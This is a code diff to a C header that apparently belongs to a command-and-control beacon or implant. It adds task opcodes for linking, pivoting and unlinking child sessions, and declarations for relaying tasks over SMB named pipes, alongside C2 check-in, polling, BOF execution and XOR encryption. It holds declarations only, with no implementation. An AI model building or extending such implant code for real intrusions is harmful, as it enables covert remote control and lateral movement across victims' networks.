@@ -9,6 +9,14 @@
 #define CMD_PWD    0x03
 #define CMD_LS     0x04
 #define CMD_BOF    0x05
+#define CMD_LINK   0x06
+#define CMD_PIVOT  0x07  // parent relays tasks to SMB child (Exchange)
+
+#define PIVOT_RESULT_MAGIC 0x50  // first byte of CMD_PIVOT result back to C2
+#define PIVOT_DEAD_MAGIC   0x44  // CMD_PIVOT failed - child pipe broken; payload = [36B child_uuid]
+#define EXIT_MAGIC         0x45  // CMD_EXIT confirmation byte sent before TerminateProcess
+
+#define CMD_UNLINK       0x08  // unlink a named-pipe child session by UUID
 
 
 // Heap subsystem
@@ -33,8 +41,18 @@ BOOL Transport_Checkin ();
 BOOL Transport_Poll ( PVOID* out_buf, UINT32* out_len );
 BOOL Task_Dispatch  ( PVOID buf, UINT32 buf_len );
 
+// SMB child role - named-pipe send/receive (used in place of Transport_Send when SMB profile)
+BOOL Smb_Send( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len );
+
+// SMB parent relay role - manage connected child pipe sessions
+PVOID Smb_Add ( PCHAR pipe_path );            // open child pipe, read checkin, return node
+BOOL  Smb_Rm  ( PVOID node );                 // close pipe handle, free node
+PVOID Smb_Get ( PCHAR uuid );                 // find node by child UUID
+PVOID Smb_List();                             // return head of the linked list
+
 void Beacon_Sleep( ULONG ms );
 VOID Malleable_Init();
+VOID Config_Smb_Init();
 
 // Crypto subsystem
 void Crypt_Xor    ( PVOID buf, SIZE_T size, ULONG_PTR key );
